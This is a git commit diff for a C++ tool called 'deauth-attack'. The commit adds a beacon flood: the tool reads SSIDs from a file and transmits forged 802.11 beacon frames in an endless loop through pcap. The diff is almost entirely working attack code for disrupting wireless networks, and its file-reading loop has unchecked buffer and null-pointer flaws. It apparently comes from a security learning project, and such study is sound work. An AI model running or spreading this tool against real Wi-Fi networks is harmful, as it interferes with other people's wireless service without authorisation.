45737a813db3d7af6c77013a77fc8f9edb956d3e
alertjjm <sdr2936@gmail.com>
2021-02-09 18:22:14 +0900

    [ADD] Beacon Flood

--- main.cpp
+++ main.cpp
@@ -7,14 +7,19 @@
 #include "header.h"
 using namespace std;
 void usage() {
-    printf("syntax : deauth-attack <interface> <ap mac> [<station mac>]\n");
-    printf("sample : deauth-attack wlan1 70:5D:CC:04:2B:A2 66:77:88:99:AA:BB\n");
+    printf("syntax : deauth-attack <interface> <ap mac> <filename>\n");
+    printf("sample : deauth-attack wlan1 70:5D:CC:04:2B:A2 ssid-list.txt\n");
 }
-void send_deauth(pcap_t* handle, Mac ap, Mac st){
-    char ssid[40]="helloworld";
+void send_deauth(pcap_t* handle, Mac ap, Mac st,char ssidlist[][40], int len){
+    char ssid[40];
     u_char supported_data_rates[8]={0x82,0x84,0x8b,0x96,0x24,0x30,0x48,0x6c};
     u_char currentch[1]={0x0c};
-    static int count=1;
+    static int count=0;
+    strcpy(ssid,ssidlist[count++]);
+    if(ssid[strlen(ssid)-1]=='\n'){
+        ssid[strlen(ssid)-1]=0;
+    }
+    count=count%len;
     int totallen=sizeof(radiotap_header)+sizeof(ieeeheader)+6+strlen(ssid)+sizeof(supported_data_rates)/sizeof(u_char)+sizeof(currentch)/sizeof(u_char);
     frame packet=frame(ap,st);
     Taggedparameter ssidparameter=Taggedparameter(0,strlen(ssid),(u_char*)ssid);
@@ -28,34 +33,43 @@ void send_deauth(pcap_t* handle, Mac ap, Mac st){
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 	}
-    cout<<"[INFO] Beacon!! from "<<string(ap)<<" to "<<string(st)<<" ["<<count++<<"]"<<endl;
+    cout<<"[INFO] Beacon!! from "<<string(ap)<<" to "<<string(st)<<" ["<<count<<"] "<<string(ssid)<<endl;
 }
 int main(int argc, char* argv[]) {
+    char* line;
+    int linecount=0;
+    char buffer[40];
     Mac ap;
     Mac st;
     if (argc < 3) {
         usage();
         return -1;
     }
-    if(argc==3){
+    else{
         ap=Mac(string(argv[2]));
         st=Mac("ff:ff:ff:ff:ff:ff");
     }
-    else{
-        ap=Mac(string(argv[2]));
-        st=Mac(string(argv[3]));
-    }
     char* dev = argv[1];
+    char ssidlist[100][40];
+    FILE* fp=fopen(argv[3],"rt");
+    if(fp==NULL){
+        printf("%s open failure\n",argv[3]);
+        exit(1);
+    }
+    while(!feof(fp)){
+        line = fgets(buffer,sizeof(buffer),fp);
+        memcpy(ssidlist[linecount++],line,strlen(line)+1);
+    }
+	fclose(fp);
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
     if (handle == nullptr) {
         fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", dev, errbuf);
         return -1;
     }
-
     while (true) {
-        send_deauth(handle, ap,st);
-        usleep(100000);
+        send_deauth(handle, ap,st,ssidlist, linecount);
+        usleep(int(100000/linecount));
     }
     pcap_close(handle);
 }
